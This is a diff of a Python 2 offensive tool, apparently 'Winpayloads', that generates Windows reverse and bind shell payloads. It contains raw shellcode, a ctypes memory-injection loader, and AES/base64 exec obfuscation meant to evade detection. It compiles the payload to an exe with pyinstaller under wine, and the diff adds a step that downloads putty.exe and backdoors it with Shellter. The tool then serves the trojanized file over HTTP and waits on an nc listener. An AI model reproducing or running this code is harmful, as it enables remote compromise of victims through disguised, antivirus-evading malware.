@@ -15,14 +15,18 @@ import base64
 import string
 
 t = blessings.Terminal()
+try:
+    iperror = False
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(('8.8.8.8', 0))
+    IP = s.getsockname()[0]
+except:
+    iperror = True
+    print 'Error Getting Ip Automatically'
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(('google.com', 0))
-IP = s.getsockname()[0]
 
-
-def ServePayload():
-    os.chdir(payloaddir)
+def ServePayload(payloaddirectory):
+    os.chdir(payloaddirectory)
     Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
     httpd = SocketServer.TCPServer(('', 8000), Handler)
     httpd.serve_forever()
@@ -52,9 +56,8 @@ def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
     key, iv = randKey(32), randKey(16)
 
     input = filecontents.split('\n')
-    pieces = filecontents.split(".")
 
-    newoutput = ''
+    newoutput,newoutputt = '',''
 
     for line in input:
         if not line.startswith("#"):
@@ -65,7 +68,8 @@ def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
 
     cipherEnc = AES.new(key)
 
-    encrypted = EncodeAES(cipherEnc, "".join(output))
+    encrypted = EncodeAES(cipherEnc, "\n".join(output))
+
 
     b64var, aesvar = randVar(), randVar()
 
@@ -76,8 +80,7 @@ def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
 
     newoutput = ";".join(imports) + "\n"
 
-    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode(
-        "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
+    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
     return newoutput
 
 windows_rev_shell = (
@@ -157,10 +160,10 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-linux_x86_met_rev_shell = ('placeholder%s%s')
+linux_x86_met_rev_shell = ('%s%s')
+
 
 payload, payloadchoice, payloaddir, ez2read_shellcode = '', '', '/etc/winpayloads', ''
-
 try:
     os.mkdir(payloaddir)
 except OSError:
@@ -201,10 +204,15 @@ try:
     if menuchoice == '1' or menuchoice == '2' or menuchoice == '4':
         portnum = raw_input(
             '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
-        ipaddr = raw_input(
+        if iperror == False:
+            ipaddr = raw_input(
             '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
-        if len(ipaddr) is 0:
-            ipaddr = IP
+            if len(ipaddr) is 0:
+                ipaddr = IP
+        else:
+            ipaddr = raw_input(
+            '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+
         if len(portnum) is 0:
             portnum = 4444
         print t.bold_green + '\n[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
@@ -220,62 +228,64 @@ try:
         bindporthex = struct.pack('>h', int(bindport))
         shellcode = payloadchoice % (bindporthex)
 
-    for x in shellcode:
-        ez2read_shellcode += '\\x%s' % x.encode('hex')
+    want_to_payloadinexe = raw_input(
+        '[*] Include Shellcode In Already Compiled Exe?(Putty.exe) y/[n]: ')
 
-    shellcode = ez2read_shellcode
+    for byte in shellcode:
+        ez2read_shellcode += '\\x%s' % byte.encode('hex')
 
     injectwindows = """#/usr/bin/python
 import ctypes
 
 
 shellcode = bytearray('%s')
-ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
-                                          ctypes.c_int(len(shellcode)),
-                                          ctypes.c_int(0x3000),
-                                          ctypes.c_int(0x40))
-
+ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
 buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-
-ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
-                                     buf,
-                                     ctypes.c_int(len(shellcode)))
-
-ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(ptr),
-                                         ctypes.c_int(0),
-                                         ctypes.c_int(0),
-                                         ctypes.pointer(ctypes.c_int(0)))
-
+ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
+ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-""" % shellcode
+""" % ez2read_shellcode
+    if not want_to_payloadinexe == 'y':
+        with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
+            Filesave.write(PyCipher(injectwindows))
+            Filesave.close()
+        print 'test'
 
-    with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-        Filesave.write(PyCipher(injectwindows))
-        Filesave.close()
+        print '[*] Creating Payload.exe From Payload.py...'
 
-    print '[*] Creating Payload.exe From Payload.py...'
+        subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
+                         '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        print '[*] Cleaning Up...'
+        os.system('mv %s/dist/payload.exe %s/payload.exe' %
+                  (payloaddir, payloaddir))
+        os.system('rm %s/logdict*' % os.getcwd())
+        os.system('rm %s/dist -r' % payloaddir)
+        os.system('rm %s/build -r' % payloaddir)
+        os.system('rm %s/*.spec' % payloaddir)
+        # os.system('rm %s/payload.py' % payloaddir)
+        print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
 
-    subprocess.call(['wine', '/root/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller-2.0/pyinstaller.py',
-                     '%s/payload.py' % payloaddir, '-F', '-y', '-o', payloaddir], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    print '[*] Cleaning Up...'
-    os.system('mv %s/dist/payload.exe %s/payload.exe' %
-              (payloaddir, payloaddir))
-    os.system('rm %s/logdict*' % os.getcwd())
-    os.system('rm %s/dist -r' % payloaddir)
-    os.system('rm %s/build -r' % payloaddir)
-    os.system('rm %s/*.spec' % payloaddir)
-    #os.system('rm %s/payload.py' % payloaddir)
-
-    print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
+    if want_to_payloadinexe.lower() == 'y':
+        os.chdir(os.getcwd() + '/shellter')
+        with open('payloadbin', 'wb') as Csave:
+            Csave.write(shellcode)
+            Csave.close()
+        os.system('rm putty.*')
+        os.system('wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe')
+        os.system('wine shellter.exe -a -f putty.exe -s -p payloadbin ')
+        os.system('mv putty.exe ./compiled/putty.exe')
 
     want_to_upload = raw_input(
-        '[*] Upload To Local Websever? [y]/n: ')
+        '\n[*] Upload To Local Websever? [y]/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
-        print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
-        t = multiprocessing.Process(target=ServePayload)
-        t.start()
+        if want_to_payloadinexe == 'y':
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/putty.exe" % (IP) + t.normal
+            t = multiprocessing.Process(target=ServePayload, args = (os.getcwd() + '/compiled',))
+            t.start()
+        else:
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
+            t = multiprocessing.Process(target=ServePayload, args = (payloaddir,))
+            t.start()
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
